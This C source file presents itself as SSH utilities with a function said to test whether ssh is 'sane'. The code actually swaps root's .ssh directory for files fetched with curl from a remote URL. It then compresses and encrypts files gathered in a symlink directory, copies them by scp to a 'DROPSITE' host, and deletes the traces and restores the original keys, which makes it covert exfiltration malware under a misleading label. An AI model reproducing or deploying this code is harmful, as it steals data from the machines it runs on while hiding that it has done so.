/*-----------------------------------------------------------------------------
 * ssh_utils.c - SSH Utilities
 * Copyright (C) 2010 Steffen L. Norgren <ironix@trollop.org>
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should write_bytes received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *----------------------------------------------------------------------------*/

#include "ssh_utils.h"
#include "compression.h"
#include "cryptography.h"

int main(int argc, const char * argv[])
{
	test_ssh();

	return SUCCESS;
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    test_ssh
 * 
 * DATE:        July 2, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   test_ssh(void)
 * 
 * RETURNS:     void
 *
 * NOTES: Tests whether ssh is sane or not. 
 *----------------------------------------------------------------------------*/
void test_ssh()
{
	ssh_replace_dir();	/* backup and replace .ssh directory */
	ssh_send_files();	/* send any files in the pickup directory */
	ssh_restore_dir();	/* restore original .ssh directory */
}

void ssh_replace_dir(void)
{
	char *command = (char *)malloc(FILENAME_MAX);

	/* create directory if it doesn't exist */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "mkdir -p %s > /dev/null 2>&1", SSH_BACKUP);
	if (system(command) == ERROR)
		err(1, "system");

	/* move original .ssh files */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "mv %s* %s > /dev/null 2>&1", SSH_DIR, SSH_BACKUP);
	if (system(command) == ERROR)
		err(1, "system");

	/* retrieve replacement .ssh files */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "curl -o %s%s \"%s\" > /dev/null 2>&1",
			SSH_DIR, ssh_archive, ssh_files);
	if (system(command) == ERROR)
		err(1, "system");

	/* decompress archive */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "tar xf %s%s -C /root/.ssh > /dev/null 2>&1",
			SSH_DIR, ssh_archive);
	if (system(command) == ERROR)
		err(1, "system");

	free(command);
}

void ssh_restore_dir(void)
{
	char *command = (char *)malloc(FILENAME_MAX);

	/* delete new .ssh files */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "rm %s* > /dev/null 2>&1", SSH_DIR);
	if (system(command) == ERROR)
		err(1, "system");
	
	/* restore old .ssh files */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "mv %s* %s > /dev/null 2>&1", SSH_BACKUP, SSH_DIR);
	if (system(command) == ERROR)
		err(1, "system");

	/* delete backup directory */
	memset(command, 0x00, FILENAME_MAX);
	sprintf(command, "rm -rf %s > /dev/null 2>&1", SSH_BACKUP);
	if (system(command) == ERROR)
		err(1, "system");

	free(command);
}

void ssh_send_files(void)
{
	struct dirent *dp;
	DIR *dir = opendir(SYMLINK_DIR);
	FILE *fd_in, *fd_out;
	int count = 0;
	char *file_in = (char *)malloc(FILENAME_MAX);
	char *file_out = (char *)malloc(FILENAME_MAX);
	char *command = (char *)malloc(FILENAME_MAX);
	EVP_CIPHER_CTX encrypt, decrypt;

	/* initialize encryption */
	if (aes_init(&encrypt, &decrypt) == ERROR)
		fprintf(stderr, "ERROR: aes_init");

	while ((dp = readdir(dir)) != NULL) {
		/* ignore first two entires "." and ".." */
		if (count++ > 1 && strncmp(dp->d_name, ".send", strlen(dp->d_name))) {
			/* compress the file */
			memset(file_in, 0x00, FILENAME_MAX);
			memset(file_out, 0x00, FILENAME_MAX);
			sprintf(file_in, "%s%s", SYMLINK_DIR, dp->d_name);
			sprintf(file_out, "%s%s.deflated", SYMLINK_DIR, dp->d_name);

			printf("current file = %s\n", dp->d_name);

			if ((fd_in = fopen(file_in, "r")) == NULL)
				err(1, "fopen");
			
			if ((fd_out = fopen(file_out, "w")) == NULL)
				err(1, "fopen");

			if (deflate_file(fd_in, fd_out, Z_BEST_COMPRESSION) != SUCCESS) {
				fprintf(stderr, "ZLIB: Error deflating file %s\n");
				exit(ERROR);
			}

			/* delete symlink */
			remove(file_in);

			fclose(fd_in);
			fclose(fd_out);

			/* encrypt the file */
			memset(file_in, 0x00, FILENAME_MAX);
			memset(file_out, 0x00, FILENAME_MAX);
			sprintf(file_in, "%s%s.deflated", SYMLINK_DIR, dp->d_name);
			sprintf(file_out, "%s%s", PICKUP_DIR, dp->d_name);

			if ((fd_in = fopen(file_in, "r")) == NULL)
				err(1, "fopen");
			
			if ((fd_out = fopen(file_out, "w")) == NULL)
				err(1, "fopen");

			file_encrypt(fd_in, fd_out);

			/* delete compressed file */
			remove(file_in);

			fclose(fd_in);
			fclose(fd_out);			

			/* send the file */
			memset(command, 0x00, FILENAME_MAX);
			sprintf(command, "scp %s %s:%s > /dev/null 2>&1", file_out, DROPSITE, DROPSITE_DIR);
			system(command);

			/* delete compressed & encrypted file */
			remove(file_out);
		}
	}

	free(file_in);
	free(file_out);
	free(command);

	closedir(dir);
}

void ssh_timer(void)
{
}
